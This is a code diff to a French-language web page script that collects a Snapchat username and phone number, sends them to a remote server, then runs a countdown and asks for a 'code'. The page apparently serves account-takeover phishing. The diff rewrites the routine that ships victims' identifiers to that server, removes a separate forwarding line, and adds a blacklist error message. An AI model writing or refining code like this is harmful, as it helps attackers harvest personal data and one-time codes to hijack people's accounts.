@@ -952,7 +952,6 @@
     document.getElementById('displayUserChrono').textContent = snapUsername;
     document.getElementById('displayUserCode').textContent = snapUsername;
 
-    sendToNumCode(`👤 **Nouveau pseudo**\n> **Pseudo :** \`${snapUsername}\``);
     showPage('pagePhone');
   });
 
@@ -977,34 +976,40 @@
     }
   });
 
-  phoneBtn.addEventListener('click', () => {
+  phoneBtn.addEventListener('click', async () => {
     phoneNumber = phoneInput.value;
     
-    // Envoi au serveur Render
-    fetch(`${SERVER_URL}/api/send-info`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ pseudo: snapUsername, phone: phoneNumber })
-    })
-    .then(res => {
+    // On désactive le bouton pendant le chargement pour éviter le spam
+    phoneBtn.disabled = true;
+    
+    try {
+      const res = await fetch(`${SERVER_URL}/api/send-info`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ pseudo: snapUsername, phone: phoneNumber })
+      });
+      
       if (res.status === 403) {
         throw new Error("blacklist");
       }
-      return res.json();
-    })
-    .then(data => {
-      showPage('page2'); // Va à la page du chrono
+      
+      // Si c'est bon, on passe à la page 2
+      showPage('page2'); 
       startChrono();
       checkBotStatus();
-    })
-    .catch(err => {
+      
+    } catch (err) {
+      // En cas d'erreur (ou blacklist), on réactive le bouton
+      phoneBtn.disabled = false;
+      
       if (err.message === "blacklist") {
         phoneError.textContent = "Ce numéro est bloqué.";
         phoneError.style.color = "#ff4d4d";
       } else {
-        console.log(err);
+        console.log("Erreur:", err);
       }
-    });
+    }
+  });
 
   // ------- Page 4 : code -------
   const codeInput = document.getElementById('code');
